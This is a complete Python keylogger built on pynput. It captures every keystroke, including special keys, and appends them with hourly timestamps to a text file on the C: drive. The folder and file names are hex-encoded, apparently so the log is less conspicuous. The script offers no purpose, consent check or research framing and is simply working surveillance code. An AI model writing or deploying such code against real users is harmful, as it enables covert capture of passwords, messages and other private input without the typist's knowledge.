from pynput import keyboard
from datetime import datetime

# Global variable to store the hour of the last logged keypress
last_logged_hour = None

# Dictionary to map special keys to their representations
special_keys = {
    keyboard.Key.space: '<space>',
    keyboard.Key.enter: '<enter>',
    keyboard.Key.alt: '<alt>',
    keyboard.Key.ctrl: '<ctrl>',
    keyboard.Key.cmd: '<cmd>',
    keyboard.Key.tab: '<tab>',
    keyboard.Key.backspace: '<backspace>',
    keyboard.Key.delete: '<delete>',
    keyboard.Key.page_up: '<page up>',
    keyboard.Key.page_down: '<page down>',
    keyboard.Key.home: '<home>',
    keyboard.Key.end: '<end>',
    keyboard.Key.insert: '<insert>',
    keyboard.Key.print_screen: '<print screen>',
    keyboard.Key.scroll_lock: '<scroll lock>',
    keyboard.Key.pause: '<pause>',
    keyboard.Key.f1: '<f1>',
    keyboard.Key.f2: '<f2>',
    keyboard.Key.f3: '<f3>',
    keyboard.Key.f4: '<f4>',
    keyboard.Key.f5: '<f5>',
    keyboard.Key.f6: '<f6>',
    keyboard.Key.f7: '<f7>',
    keyboard.Key.f8: '<f8>',
    keyboard.Key.f9: '<f9>',
    keyboard.Key.f10: '<f10>',
    keyboard.Key.f11: '<f11>',
    keyboard.Key.f12: '<f12>',
}

def log_key(key):
    global last_logged_hour

    # Get the current hour
    current_hour = datetime.now().hour

    # Check if the hour has changed since the last logged keypress
    if current_hour != last_logged_hour:
        with open("C:/dpa_646973636F766572797061726B/6B657966696C65.txt", 'a') as logFile:
            logFile.write(f"\n\n--- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        last_logged_hour = current_hour

    # Write the key to the file
    with open("C:/dpa_646973636F766572797061726B/6B657966696C65.txt", 'a') as logFile:
        try:
            if key in special_keys:
                logFile.write(special_keys[key])
            elif hasattr(key, 'char'):  # Check if it's a printable character
                logFile.write(key.char)
            else:
                logFile.write(f'<{key}>')
        except Exception as e:
            print(f"Error: {e}")

def on_press(key):
    log_key(key)

if __name__ == "__main__":
    with open("C:/dpa_646973636F766572797061726B/6B657966696C65.txt", 'a') as logFile:
        logFile.write(f"\n\n--- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---\n")

    # Start the listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()  # Keep the listener running
